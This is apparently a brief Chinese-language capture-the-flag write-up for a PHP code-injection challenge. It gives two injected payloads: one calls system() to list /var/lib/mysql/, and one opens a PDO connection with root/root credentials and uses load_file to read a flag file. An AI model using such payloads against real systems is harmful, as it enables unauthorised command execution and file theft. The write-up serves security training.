# 知识点

# 思路
```php
?c=system("ls /var/lib/mysql/");
```
可以现在其他题目中找到数据库名<br />![image.png](./images/20231017_2351079174.png)<br />通过pdo使用数据库访问数据
```php
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
```
